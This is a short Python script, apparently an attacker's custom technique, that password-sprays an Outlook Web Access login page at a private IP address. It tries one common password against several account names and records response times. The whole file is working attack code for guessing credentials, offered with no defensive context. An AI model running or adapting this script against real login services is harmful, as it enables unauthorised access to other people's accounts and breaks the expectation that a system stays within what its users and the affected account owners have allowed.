
# Custom TTP: Password Spray Combined with Timing Analysis
import requests
import time

base_url = "http://172.20.10.7:80"
login_url = f"{base_url}/owa/auth.owa"
users = ["admin", "user", "test"]
password = "commonpassword"  # Using the same password for all users

def password_spray():
    print("Starting password spray...")
    for user in users:
        start_time = time.time()
        payload = {"username": user, "password": password}
        response = requests.post(login_url, data=payload)
        end_time = time.time()

        if response.status_code == 200 and "Login Successful" in response.text:
            print(f"[+] Successful login: {user}:{password}")
        else:
            print(f"[-] Failed login: {user}:{password}")

        print(f"Response time: {end_time - start_time:.2f} seconds")

password_spray()